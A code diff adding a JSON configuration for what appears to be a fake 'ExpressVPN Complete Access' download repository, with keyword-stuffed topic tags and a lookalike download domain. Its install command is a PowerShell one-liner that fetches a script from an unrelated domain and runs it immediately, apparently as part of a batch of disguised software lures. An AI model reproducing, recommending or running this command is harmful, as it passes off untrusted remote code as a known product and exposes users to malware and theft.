@@ -1,0 +1,29 @@
+{
+  "repo": "expressvpn-complete-access",
+  "product": "ExpressVPN Complete Access",
+  "kind": "vpn",
+  "install_type": "download",
+  "download_url": "https://expressvpn.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "vpn",
+  "topics": [
+    "expressvpn-x64",
+    "expressvpn-stable-build",
+    "online-privacy",
+    "expressvpn-build",
+    "privacy-client",
+    "modern-ui",
+    "lightweight-client",
+    "pc-toolkit",
+    "server-switcher",
+    "dns-filter",
+    "x64-build",
+    "native-windows",
+    "how-to-install-expressvpn",
+    "expressvpn-support",
+    "fast-startup"
+  ]
+}
